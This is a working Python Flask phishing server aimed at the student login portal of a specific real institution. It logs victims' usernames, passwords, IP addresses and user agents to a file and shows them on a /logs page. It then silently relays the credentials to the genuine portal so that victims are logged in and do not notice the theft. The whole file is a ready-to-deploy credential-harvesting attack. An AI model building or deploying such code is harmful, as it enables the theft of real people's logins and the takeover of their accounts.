from flask import Flask, request, render_template, redirect, make_response
from datetime import datetime
import json, os

app = Flask(__name__)
LOG_FILE = "captured.json"

REAL_AJAX    = "https://sigedin.itp.edu.co/estudiantes/ajax_validate_login/ajax_validate_login.php"
REAL_PORTAL  = "https://sigedin.itp.edu.co/estudiantes/app_Login/app_Login.php"

def save_capture(data):
    entries = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            entries = json.load(f)
    entries.append({**data, "timestamp": datetime.now().isoformat()})
    with open(LOG_FILE, "w") as f:
        json.dump(entries, f, indent=2)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/submit", methods=["POST"])
def submit():
    user = request.form.get("email", "")
    pwd  = request.form.get("password", "")

    save_capture({
        "user": user,
        "password": pwd,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent")
    })

    # Form auto-submit directo al endpoint real — el browser hace el POST nativo,
    # recibe las cookies de sesión del servidor real y sigue el redirect normalmente.
    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Iniciando sesión...</title>
  <style>
    body {{ font-family: Arial, sans-serif; display:flex; align-items:center;
           justify-content:center; height:100vh; margin:0; background:#f0f2f5; }}
    .msg {{ text-align:center; color:#003087; }}
    .spinner {{ width:40px;height:40px;border:4px solid #ccc;border-top-color:#003087;
               border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px; }}
    @keyframes spin {{ to{{ transform:rotate(360deg) }} }}
  </style>
</head>
<body>
  <div class="msg">
    <div class="spinner"></div>
    <p>Validando datos institucionales...</p>
  </div>

  <script>
    const BASE = "https://sigedin.itp.edu.co/estudiantes/";
    const HOME = BASE + "app_menu/app_menu.php";

    fetch("{REAL_AJAX}", {{
      method: "POST",
      headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
      credentials: "include",
      body: "user={user}&pass={pwd}"
    }})
    .then(r => r.json())
    .then(data => {{
      if (!data.error && data.redir) {{
        // redir viene como "../app_menu/app_menu.php" — lo resolvemos desde base
        const url = new URL(data.redir.replace(/^\.\.\//,""), BASE).href;
        window.location.href = url;
      }} else {{
        window.location.href = HOME;
      }}
    }})
    .catch(() => {{
      // CORS bloqueó la lectura de respuesta pero el POST ya fue enviado y
      // las cookies de sesión quedaron seteadas — ir directo al home
      window.location.href = HOME;
    }});
  </script>
</body>
</html>"""
    return make_response(html)

@app.route("/logs")
def logs():
    if not os.path.exists(LOG_FILE):
        return "<pre>Sin capturas aún.</pre>"
    with open(LOG_FILE) as f:
        data = json.load(f)
    rows = "".join(
        f"<tr><td>{e['timestamp']}</td><td>{e['user']}</td><td>{e['password']}</td><td>{e['ip']}</td></tr>"
        for e in data
    )
    return f"""<html><head><style>
    body{{font-family:Arial;padding:20px}} table{{border-collapse:collapse;width:100%}}
    th,td{{border:1px solid #ccc;padding:8px 12px;text-align:left}}
    th{{background:#003087;color:#fff}}
    </style></head><body>
    <h2>Capturas registradas</h2>
    <table><tr><th>Timestamp</th><th>Usuario</th><th>Contraseña</th><th>IP</th></tr>{rows}</table>
    </body></html>"""

if __name__ == "__main__":
    app.run(debug=True, port=5000)
